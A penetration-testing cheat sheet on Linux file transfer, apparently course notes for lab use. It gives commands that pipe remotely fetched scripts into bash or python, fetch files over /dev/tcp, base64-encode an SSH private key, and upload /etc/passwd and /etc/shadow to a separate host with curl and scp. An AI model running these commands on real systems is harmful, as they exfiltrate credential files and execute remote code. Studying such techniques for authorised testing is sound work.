---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Linux File Transfer Methods

### Base64 Encoding / Decoding

Pwnbox - Check File MD5 hash

```
md5sum id_rsa
```

Pwnbox - Encode SSH Key to Base64

```
cat id_rsa |base64 -w 0;echo
```

Linux - Decode the File

```
echo -n 'LS0tLS1CRUdJTiB.........dfgfQo=' | base64 -d > id_rsa
```

Linux - Confirm the MD5 Hashes Match

```
md5sum id_rsa
```

### Web Downloads with Wget and cURL

Download a File Using wget

{% code fullWidth="true" %}
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
{% endcode %}

Download a File Using cURL

{% code fullWidth="true" %}
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
{% endcode %}

### Fileless Attacks Using Linux

Fileless Download with cURL

```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Fileless Download with wget

{% code fullWidth="true" %}
```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
{% endcode %}

### Download with Bash (/dev/tcp)

Connect to the Target Webserver

```
exec 3<>/dev/tcp/10.10.10.32/80
```

HTTP GET Request

```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

Print the Response

```
cat <&3
```

### SSH Downloads

Enabling the SSH Server

```
sudo systemctl enable ssh
```

Starting the SSH Server

```
sudo systemctl start ssh
```

Checking for SSH Listening Port

```
netstat -lnpt
```

**Linux - Downloading Files Using SCP**

```
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

### Upload Operations

### Web Upload

Pwnbox - Start Web Server

```
sudo python3 -m pip install --user uploadserver
```

Pwnbox - Create a Self-Signed Certificate

{% code fullWidth="true" %}
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
{% endcode %}

Pwnbox - Start Web Server

```
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```

Linux - Upload Multiple Files

{% code fullWidth="true" %}
```
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
{% endcode %}

### Alternative Web File Transfer Method

Linux - Creating a Web Server with Python3

```
python3 -m http.server
```

Linux - Creating a Web Server with Python2.7

```
python2.7 -m SimpleHTTPServer
```

Linux - Creating a Web Server with PHP

```
php -S 0.0.0.0:8000
```

Linux - Creating a Web Server with Ruby

```
ruby -run -ehttpd . -p8000
```

Download the File from the Target Machine onto the Pwnbox

```
wget 192.168.49.128:8000/filetotransfer.txt
```

### SCP Upload

```
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```
